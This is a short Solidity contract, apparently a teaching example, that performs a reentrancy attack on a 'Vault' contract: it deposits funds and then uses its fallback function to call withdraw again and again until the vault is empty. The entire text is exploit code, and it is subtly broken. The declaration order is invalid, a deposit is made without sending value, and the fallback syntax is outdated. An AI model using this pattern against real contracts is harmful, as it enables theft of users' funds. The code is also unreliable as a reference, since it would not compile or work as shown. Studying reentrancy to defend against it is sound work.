contract ReentrancyAttack {
    Vault public vault;
    uint amount public = 100000000000;

    constructor(address vaultAddress) {
        vault = Vault(vaultAddress);
    }

    function hack() external {
      vault.deposit(amount);
    }

    function() payable { // Fallback function
      if (vault.balance != 0 ) {
        vault.withdraw(amount); // Re-enter the Vault
      }
    }
}